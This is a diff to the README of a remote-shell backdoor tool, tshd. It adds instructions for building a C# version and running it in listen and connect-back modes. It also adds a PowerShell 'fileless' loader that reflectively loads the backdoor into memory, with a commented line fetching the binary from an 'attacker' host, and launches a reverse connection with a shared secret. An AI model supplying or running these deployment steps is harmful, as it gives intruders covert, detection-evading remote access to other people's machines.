@@ -67,6 +67,12 @@ $ make windows_dll
 env CGO_ENABLED=1 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags "-s -w -H=windowsgui" -o ./build/tshd.dll cmd/tshd_dll.go
 ```
 
+#### Build for C# (Mono)
+
+```
+$ mcs -out:build/tshd.exe cmd/tshd.cs
+```
+
 ### How to use the tshd (server)
 
 #### Help
@@ -102,6 +108,35 @@ $ ./build/tshd_linux_amd64 -c <client hostname>
 
 ```
 rundll32.exe tshd.dll,Run -c <client hostname> -p 2345 -s mysecret -d 10
+```
+
+#### Run C# version
+
+```
+# Listen mode
+$ mono build/tshd.exe -p 1234 -s mysecret
+
+# Connect back mode
+$ mono build/tshd.exe -c <client hostname> -p 2345 -s mysecret -d 10
+```
+
+#### Run C# version via PowerShell (Fileless/Memory Load)
+
+You can load the compiled `tshd.exe` into memory and execute it using PowerShell:
+
+```powershell
+# Load bytes
+$bytes = [System.IO.File]::ReadAllBytes("tshd.exe")
+# Or download: $bytes = (New-Object System.Net.WebClient).DownloadData("http://attacker/tshd.exe")
+
+# Load assembly
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+
+# Invoke Main
+$entryPoint = $assembly.EntryPoint
+# Arguments: -c <host> -p <port> -s <secret>
+$args = [string[]] @("-c", "192.168.1.100", "-p", "1234", "-s", "1234")
+$entryPoint.Invoke($null, [object[]] @(,$args))
 ```
 
 ### How to use the tsh (client)
